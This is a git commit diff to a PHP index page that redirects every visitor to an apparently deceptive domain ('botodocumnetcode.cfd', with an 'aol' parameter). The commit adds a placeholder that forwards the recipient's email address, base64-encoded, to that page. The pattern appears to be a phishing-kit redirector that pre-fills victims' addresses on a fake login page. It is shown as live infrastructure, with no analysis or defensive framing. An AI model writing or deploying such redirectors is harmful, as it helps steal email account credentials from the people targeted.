657a72cfb0cda40927b13f5e5bdd3e3a228e4bec
supportwinnerhill <support@winnerhill.com>
2026-09-09 19:55:19 +0000

    Update

--- index.php
+++ index.php
@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://view-rdjef8eze.botodocumnetcode.cfd/?aol=1/");
+header("Location: https://view-rdjef8eze.botodocumnetcode.cfd/?aol=1&hint={RECIPIENT_BASE64_EMAIL}/");
 exit();
 ?>
